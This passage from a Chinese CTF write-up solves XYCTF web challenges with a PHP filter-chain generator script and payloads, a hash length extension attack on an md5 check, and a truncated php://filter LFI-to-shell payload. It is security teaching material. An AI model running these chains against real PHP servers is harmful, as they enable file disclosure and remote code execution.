&quot;.$)Caaaaaaaaaaaaaa&quot;</span></span><br></pre></td></tr></table></figure><p>这个<code>UTF8.CSISO2022KR</code>编码形式产生的字符串里面，<code>.$)</code>其实是不可见字符（试过就知道），对于 PHP Base64 来说是非法字符，所以接下来我们只需要 base64-decode  一下就可以去掉不可见字符了，但是与此同时，我们的 C 字符也被 base64-decode 解码了，这时候我们需要再把解码结果使用一次  base64-encode 即可还原回来原来的 C 字符了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&quot;php://filter/&quot;</span>;</span><br><span class="line"><span class="variable">$url</span> .= <span class="string">&quot;convert.iconv.UTF8.CSISO2022KR&quot;</span>;</span><br><span class="line"><span class="variable">$url</span> .= <span class="string">&quot;|convert.base64-decode&quot;</span>;</span><br><span class="line"><span class="variable">$url</span> .= <span class="string">&quot;/resource=data://,aaaaaaaaaaaaaa&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Output:</span></span><br><span class="line"><span class="comment">// string(11) &quot;...i..i..i.&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&quot;php://filter/&quot;</span>;</span><br><span class="line"><span class="variable">$url</span> .= <span class="string">&quot;convert.iconv.UTF8.CSISO2022KR&quot;</span>;</span><br><span class="line"><span class="variable">$url</span> .= <span class="string">&quot;|convert.base64-decode|convert.base64-encode&quot;</span>;</span><br><span class="line"><span class="variable">$url</span> .= <span class="string">&quot;/resource=data://,aaaaaaaaaaaaaa&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Output:</span></span><br><span class="line"><span class="comment">// string(12) &quot;Caaaaaaaaaaa&quot;</span></span><br></pre></td></tr></table></figure><p>这样我们就能构造出自己想要的字符串了，脚本：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$base64_payload = <span class="string">&quot;WFlDVEY8PA==&quot;</span>;<span class="comment">//XYCTF&lt;&lt;</span></span><br><span class="line">$conversions = array(</span><br><span class="line">    &#x27;0&#x27;=&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO<span class="number">2022</span>KR|convert.iconv.UCS2.UTF8|convert.iconv.<span class="number">8859</span>_3.UCS2&#x27;,</span><br><span class="line">    &#x27;1&#x27;=&gt; &#x27;convert.iconv.ISO<span class="number">8859</span>7.UTF16|convert.iconv.RK<span class="number">1048</span>.UCS-4LE|convert.iconv.UTF32.CP<span class="number">1167</span>|convert.iconv.CP<span class="number">9066</span>.CSUCS4&#x27;,</span><br><span class="line">    &#x27;2&#x27;=&gt; &#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO<span class="number">8859</span>4.GB<span class="number">1300</span>0|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_<span class="number">6937</span>2.CSIBM921&#x27;,</span><br><span class="line">    &#x27;3&#x27;=&gt; &#x27;convert.iconv.L6.UNICODE|convert.iconv.CP<span class="number">1282</span>.ISO-IR-90|convert.iconv.ISO<span class="number">6937.8859</span>_4|convert.iconv.IBM868.UTF-16LE&#x27;,</span><br><span class="line">    &#x27;4&#x27;=&gt; &#x27;convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_<span class="number">6937</span>-2|convert.iconv.CP950.UTF-16BE&#x27;,</span><br><span class="line">    &#x27;5&#x27;=&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO<span class="number">2022</span>KR|convert.iconv.UTF16.EUCTW|convert.iconv.<span class="number">8859</span>_3.UCS2&#x27;,</span><br><span class="line">    &#x27;6&#x27;=&gt; &#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM<span class="number">1133</span>.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2&#x27;,</span><br><span class="line">    &#x27;7&#x27;=&gt; &#x27;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4&#x27;,</span><br><span class="line">    &#x27;8&#x27;=&gt; &#x27;convert.iconv.ISO<span class="number">2022</span>KR.UTF16|convert.iconv.L6.UCS2&#x27;,</span><br><span class="line">    &#x27;9&#x27;=&gt; &#x27;convert.iconv.CSIBM<span class="number">1161</span>.UNICODE|convert.iconv.ISO-IR-156.JOHAB&#x27;,</span><br><span class="line">    &#x27;A&#x27;=&gt; &#x27;convert.iconv.<span class="number">8859</span>_3.UTF16|convert.iconv.863.SHIFT_JISX<span class="number">0213</span>&#x27;,</span><br><span class="line">    &#x27;a&#x27;=&gt; &#x27;convert.iconv.CP<span class="number">1046</span>.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE&#x27;,</span><br><span class="line">    &#x27;B&#x27;=&gt; &#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB<span class="number">1300</span>0&#x27;,</span><br><span class="line">    &#x27;b&#x27;=&gt; &#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF<span class="number">00030010</span>|convert.iconv.CSIBM<span class="number">1008</span>.UTF32BE&#x27;,</span><br><span class="line">    &#x27;C&#x27;=&gt; &#x27;convert.iconv.UTF8.CSISO<span class="number">2022</span>KR&#x27;,</span><br><span class="line">    &#x27;c&#x27;=&gt; &#x27;convert.iconv.L4.UTF32|convert.iconv.CP<span class="number">1250</span>.UCS-2&#x27;,</span><br><span class="line">    &#x27;D&#x27;=&gt; &#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM<span class="number">1133</span>.IBM943|convert.iconv.IBM932.SHIFT_JISX<span class="number">0213</span>&#x27;,</span><br><span class="line">    &#x27;d&#x27;=&gt; &#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM<span class="number">1133</span>.IBM943|convert.iconv.GBK.BIG5&#x27;,</span><br><span class="line">    &#x27;E&#x27;=&gt; &#x27;convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO<span class="number">2022</span>CNEXT&#x27;,</span><br><span class="line">    &#x27;e&#x27;=&gt; &#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-<span class="number">8859</span>-1.ISO_<span class="number">6937</span>&#x27;,</span><br><span class="line">    &#x27;F&#x27;=&gt; &#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO<span class="number">8859</span>4.GB<span class="number">1300</span>0|convert.iconv.CP950.SHIFT_JISX<span class="number">0213</span>|convert.iconv.UHC.JOHAB&#x27;,</span><br><span class="line">    &#x27;f&#x27;=&gt; &#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX<span class="number">0213</span>&#x27;,</span><br><span class="line">    &#x27;g&#x27;=&gt; &#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8&#x27;,</span><br><span class="line">    &#x27;G&#x27;=&gt; &#x27;convert.iconv.L6.UNICODE|convert.iconv.CP<span class="number">1282</span>.ISO-IR-90&#x27;,</span><br><span class="line">    &#x27;H&#x27;=&gt; &#x27;convert.iconv.CP<span class="number">1046</span>.UTF16|convert.iconv.ISO<span class="number">6937</span>.SHIFT_JISX<span class="number">0213</span>&#x27;,</span><br><span class="line">    &#x27;h&#x27;=&gt; &#x27;convert.iconv.CSGB<span class="number">2312</span>.UTF-32|convert.iconv.IBM-<span class="number">1161</span>.IBM932|convert.iconv.GB<span class="number">1300</span>0.UTF16BE|convert.iconv.864.UTF-32LE&#x27;,</span><br><span class="line">    &#x27;I&#x27;=&gt; &#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO<span class="number">8859</span>4.GB<span class="number">1300</span>0|convert.iconv.BIG5.SHIFT_JISX<span class="number">0213</span>&#x27;,</span><br><span class="line">    &#x27;i&#x27;=&gt; &#x27;convert.iconv.DEC.UTF-16|convert.iconv.ISO<span class="number">8859</span>-9.ISO_<span class="number">6937</span>-2|convert.iconv.UTF16.GB<span class="number">1300</span>0&#x27;,</span><br><span class="line">    &#x27;J&#x27;=&gt; &#x27;convert.iconv.863.UNICODE|convert.iconv.ISIRI<span class="number">3342</span>.UCS4&#x27;,</span><br><span class="line">    &#x27;j&#x27;=&gt; &#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB<span class="number">1300</span>0|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16&#x27;,</span><br><span class="line">    &#x27;K&#x27;=&gt; &#x27;convert.iconv.863.UTF-16|convert.iconv.ISO<span class="number">6937</span>.UTF16LE&#x27;,</span><br><span class="line">    &#x27;k&#x27;=&gt; &#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2&#x27;,</span><br><span class="line">    &#x27;L&#x27;=&gt; &#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO<span class="number">6937</span>|convert.iconv.OSF<span class="number">00010100</span>.UHC&#x27;,</span><br><span class="line">    &#x27;l&#x27;=&gt; &#x27;convert.iconv.CP-AR.UTF16|convert.iconv.<span class="number">8859</span>_4.BIG5HKSCS|convert.iconv.MSCP<span class="number">1361</span>.UTF-32LE|convert.iconv.IBM932.UCS-2BE&#x27;,</span><br><span class="line">    &#x27;m&#x27;=&gt;&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP<span class="number">1163</span>.CSA_T500|convert.iconv.UCS-2.MSCP949&#x27;,</span><br><span class="line">    &#x27;N&#x27;=&gt; &#x27;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4&#x27;,</span><br><span class="line">    &#x27;n&#x27;=&gt; &#x27;convert.iconv.ISO<span class="number">8859</span>4.UTF16|convert.iconv.IBM<span class="number">5347</span>.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF<span class="number">00010004</span>.T.61&#x27;,</span><br><span class="line">    &#x27;O&#x27;=&gt; &#x27;convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-<span class="number">2022</span>-JP-3|convert.iconv.ISO<span class="number">2022</span>JP2.CP775&#x27;,</span><br><span class="line">    &#x27;o&#x27;=&gt; &#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF<span class="number">05010001</span>|convert.iconv.IBM912.UTF-16LE&#x27;,</span><br><span class="line">    &#x27;P&#x27;=&gt; &#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM<span class="number">1161</span>.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB&#x27;,</span><br><span class="line">    &#x27;p&#x27;=&gt; &#x27;convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO<span class="number">8859-14</span>.ISO<span class="number">6937</span>|convert.iconv.BIG-FIVE.UCS-4&#x27;,</span><br><span class="line">    &#x27;q&#x27;=&gt; &#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM<span class="number">1161</span>.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2&#x27;,</span><br><span class="line">    &#x27;Q&#x27;=&gt; &#x27;convert.iconv.L6.UNICODE|convert.iconv.CP<span class="number">1282</span>.ISO-IR-90|convert.iconv.CSA_T500-<span class="number">1983</span>.UCS-2BE|convert.iconv.MIK.UCS2&#x27;,</span><br><span class="line">    &#x27;R&#x27;=&gt; &#x27;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4&#x27;,</span><br><span class="line">    &#x27;r&#x27;=&gt; &#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF<span class="number">00010101</span>&#x27;,</span><br><span class="line">    &#x27;S&#x27;=&gt; &#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM<span class="number">1133</span>.IBM943|convert.iconv.GBK.SJIS&#x27;,</span><br><span class="line">    &#x27;s&#x27;=&gt; &#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90&#x27;,</span><br><span class="line">    &#x27;T&#x27;=&gt; &#x27;convert.iconv.L6.UNICODE|convert.iconv.CP<span class="number">1282</span>.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_<span class="number">8859</span>-2.ISO-IR-103&#x27;,</span><br><span class="line">    &#x27;t&#x27;=&gt; &#x27;convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS&#x27;,</span><br><span class="line">    &#x27;U&#x27;=&gt; &#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM<span class="number">1133</span>.IBM943&#x27;,</span><br><span class="line">    &#x27;u&#x27;=&gt; &#x27;convert.iconv.CP<span class="number">1162</span>.UTF32|convert.iconv.L4.T.61&#x27;,</span><br><span class="line">    &#x27;V&#x27;=&gt; &#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB<span class="number">1300</span>0|convert.iconv.BIG5.JOHAB&#x27;,</span><br><span class="line">    &#x27;v&#x27;=&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO<span class="number">2022</span>KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-<span class="number">8859-14</span>.UCS2&#x27;,</span><br><span class="line">    &#x27;W&#x27;=&gt; &#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM<span class="number">1161</span>.IBM-932|convert.iconv.MS932.MS936&#x27;,</span><br><span class="line">    &#x27;w&#x27;=&gt; &#x27;convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE&#x27;,</span><br><span class="line">    &#x27;X&#x27;=&gt; &#x27;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932&#x27;,</span><br><span class="line">    &#x27;x&#x27;=&gt; &#x27;convert.iconv.CP-AR.UTF16|convert.iconv.<span class="number">8859</span>_4.BIG5HKSCS&#x27;,</span><br><span class="line">    &#x27;Y&#x27;=&gt; &#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX<span class="number">0213</span>|convert.iconv.UHC.CP<span class="number">1361</span>&#x27;,</span><br><span class="line">    &#x27;y&#x27;=&gt; &#x27;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT&#x27;,</span><br><span class="line">    &#x27;Z&#x27;=&gt; &#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM<span class="number">1161</span>.IBM-932|convert.iconv.BIG5HKSCS.UTF16&#x27;,</span><br><span class="line">    &#x27;z&#x27;=&gt; &#x27;convert.iconv.865.UTF16|convert.iconv.CP901.ISO<span class="number">6937</span>&#x27;,</span><br><span class="line">    &#x27;/&#x27;=&gt; &#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4&#x27;,</span><br><span class="line">    &#x27;+&#x27;=&gt; &#x27;convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-<span class="number">1258</span>.UTF32LE|convert.iconv.ISIRI<span class="number">3342</span>.ISO-IR-157&#x27;,</span><br><span class="line">    &#x27;=&#x27;=&gt; &#x27;&#x27;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$filters = <span class="string">&quot;convert.base64-encode|&quot;</span>;</span><br><span class="line"><span class="meta"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span></span><br><span class="line">$filters .= <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span>;</span><br><span class="line"></span><br><span class="line">foreach (str_split(strrev($base64_payload)) as $c) &#123;</span><br><span class="line">    $filters .= $conversions[$c] . <span class="string">&quot;|&quot;</span>;</span><br><span class="line">    $filters .= <span class="string">&quot;convert.base64-decode|&quot;</span>;</span><br><span class="line">    $filters .= <span class="string">&quot;convert.base64-encode|&quot;</span>;</span><br><span class="line">    $filters .= <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$filters .= <span class="string">&quot;convert.base64-decode&quot;</span>;</span><br><span class="line"></span><br><span class="line">$final_payload = <span class="string">&quot;php://filter/&#123;$filters&#125;/resource=data://,aaaaaaaaaaaaaaaaaaaa&quot;</span>;</span><br><span class="line"></span><br><span class="line">var_dump($filters);</span><br><span class="line"><span class="comment">// echo $final_payload;</span></span><br><span class="line">var_dump(file_get_contents($final_payload));</span><br></pre></td></tr></table></figure><p>最后得到的<code>filters</code>的值再加上<code>string.strip_tags</code>过滤器就是我们的payload，这个过滤器会移除所有 HTML 和 XML 标签，包括 PHP 标签，这也是为啥我们要在<code>XYCTF</code>后面加上<code>&lt;&lt;</code>的原因，这样我们就可以截断文件<code>/etc/passwd</code>的内容。但我这就有个疑问，这个过滤器不是只会移除标签吗，后面文件中的内容按理说不会被移除，但测试后发现确实会将文件<code>/etc/passwd</code>中的内容移除</p><p><img src="https://bu.dusays.com/2024/06/05/666086e0b4cad.png" alt="image-20240417200805127.png"></p><p><img src="https://bu.dusays.com/2024/06/05/666086e0b420c.png" alt="image-20240417201000516.png"></p><p>我的phpstorm不知道为啥会报错，就找了个在线网站测了，我这里过滤器构造的字符串是<code>XYCTF&lt;&lt;</code>，可以看到过滤器末尾是加上了过滤器<code>string.strip_tags</code>的，最后输出只有<code>XYCTF</code>，把字符串<code>aaaaaaaaaaaaa</code>是截断了的。然后这里又有个问题，测试的时候加一个<code>&lt;</code>就行了，但这个题必须要加两个及以上才行，最终payload：</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/what&#x27;s_this.php?p=convert.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">|convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">|convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv<span class="number">.8859</span>_3.UTF16|<span class="type">convert</span>.iconv<span class="number">.863</span>.SHIFT_JISX0213|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.SE2.UTF<span class="number">-16</span>|<span class="type">convert</span>.iconv.CSIBM1161.IBM<span class="number">-932</span>|<span class="type">convert</span>.iconv.MS932.MS936|<span class="type">convert</span>.iconv.BIG5.JOHAB|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.ISO2022KR.UTF16|<span class="type">convert</span>.iconv.L6.UCS2|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.CP367.UTF<span class="number">-16</span>|<span class="type">convert</span>.iconv.CSIBM901.SHIFT_JISX0213|<span class="type">convert</span>.iconv.UHC.CP1361|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.IBM860.UTF16|<span class="type">convert</span>.iconv.ISO-IR<span class="number">-143.</span>ISO2022CNEXT|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.CP861.UTF<span class="number">-16</span>|<span class="type">convert</span>.iconv.L4.GB13000|<span class="type">convert</span>.iconv.BIG5.JOHAB|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.INIS.UTF16|<span class="type">convert</span>.iconv.CSIBM1133.IBM943|<span class="type">convert</span>.iconv.IBM932.SHIFT_JISX0213|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.CP-AR.UTF16|<span class="type">convert</span>.iconv<span class="number">.8859</span>_4.BIG5HKSCS|<span class="type">convert</span>.iconv.MSCP1361.UTF<span class="number">-32</span>LE|<span class="type">convert</span>.iconv.IBM932.UCS<span class="number">-2</span>BE|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.L5.UTF<span class="number">-32</span>|<span class="type">convert</span>.iconv.ISO88594.GB13000|<span class="type">convert</span>.iconv.CP950.SHIFT_JISX0213|<span class="type">convert</span>.iconv.UHC.JOHAB|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.SE2.UTF<span class="number">-16</span>|<span class="type">convert</span>.iconv.CSIBM1161.IBM<span class="number">-932</span>|<span class="type">convert</span>.iconv.MS932.MS936|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.base64-decode|<span class="type">string</span>.strip_tags</span><br></pre></td></tr></table></figure><p>参考文章：<a href="https://tttang.com/archive/1395/">https://tttang.com/archive/1395/</a></p><p><a href="https://blog.csdn.net/qq_46548764/article/details/136633054">https://blog.csdn.net/qq_46548764/article/details/136633054</a></p><p><a href="https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d">https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d</a></p><h3 id="give-me-flag（哈希长度拓展攻击）"><a href="#give-me-flag（哈希长度拓展攻击）" class="headerlink" title="give me flag（哈希长度拓展攻击）"></a>give me flag（哈希长度拓展攻击）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$FLAG_md5</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$FLAG</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;value&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$FLAG_md5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$value</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;value&#x27;</span>];</span><br><span class="line"><span class="variable">$md5</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">time</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$FLAG</span>.<span class="variable">$value</span>.<span class="variable">$time</span>)===<span class="variable">$md5</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;yes, give you flag: &quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">&#125;</span><br><span class="line">e307d18c7305ad56bf44edc3b025b836</span><br></pre></td></tr></table></figure><p>实验室的佬们说可能是哈希长度拓展攻击，看了下应该就是。看了半天没看懂原理，算了，浩哥说会用工具就行，我也觉得。🤓🤓🤓</p><p>这里我们可以根据这次比赛的web题的flag大概猜测出flag的长度为43，而且我们都知道flag的最后一个字符是<code>&#125;</code>，在这里，这个<code>&#125;</code>就相当于明文。他给出了flag进行md5后的值，就相当于告诉了我们密文和明文md5后的值。直接用工具梭了，</p><p>第一行要求输入密文和明文md5加密后的值，也就是flag进行md5后的值e307d18c7305ad56bf44edc3b025b836。</p><p>第二行要求输入已知的明文，也就是<code>&#125;</code></p><p>第三行输入密文长度，在flag的长度上减去1就行，因为<code>&#125;</code>算作明文，故要减去一位，也就是42</p><p>第四行输入需要增加的值，就是拼接在后面的字符串，也就是value的值和当前时间戳的值，value值随便，时间戳设置好就行，我是用bp发的</p><p><img src="https://bu.dusays.com/2024/06/05/6660871384619.png" alt="image-20240418194258024.png"></p><p>对md5传值<code>c9dd267be4865313b7ff9a1136c7b903</code></p><p>，对value传值<code>&#125;\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00X\x01\x00\x00\x00\x00\x00\x00</code>（这里要去掉后面的时间戳，因为题上会拼接），成功😆，这是浩哥在我电脑上打的，不知道为毛我打不成功💩💩💩</p><p><img src="https://bu.dusays.com/2024/06/05/6660871382fcf.png" alt="image-20240418200047780.png"></p><p>参考文章：<a href="https://www.cnblogs.com/yunen/p/13624595.html">https://www.cnblogs.com/yunen/p/13624595.html</a></p><h3 id="ezLFI（叠加过滤器进行文件包含getshell）"><a href="#ezLFI（叠加过滤器进行文件包含getshell）" class="headerlink" title="ezLFI（叠加过滤器进行文件包含getshell）"></a>ezLFI（叠加过滤器进行文件包含getshell）</h3><p>开局进来啥也没有，附件的<code>index.php</code>里有<code>&lt;?php include_once($_REQUEST[&#39;file&#39;]);</code>，如题目，是个本地文件包含，试了下，可以看<code>/etc/passwd</code>，更加确信了。尝试了很多方法，看不到啥，条件竞争也没弄上。这时候就需要用到一个工具**<a href="https://github.com/synacktiv/php_filter_chain_generator">php_filter_chain_generator</a>**，之前star学长推荐的，无敌了🤓🤓🤓。通过叠加过滤器能够在allow_url_fopen和allow_url_include双Off的情况下直接通过php:&#x2F;&#x2F;filter进行文件包含getshell。最终payload：</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/convert.iconv.UTF8.CSISO2022KR|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.CP866.CSUNICODE|<span class="type">convert</span>.iconv.CSISOLATIN5.ISO_6937<span class="number">-2</span>|<span class="type">convert</span>.iconv.CP950.UTF<span class="number">-16</span>BE|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv<span class="number">.865</span>.UTF16|<span class="type">convert</span>.iconv.CP901.ISO6937|<span class="type">convert</span>.base64-decode|<span 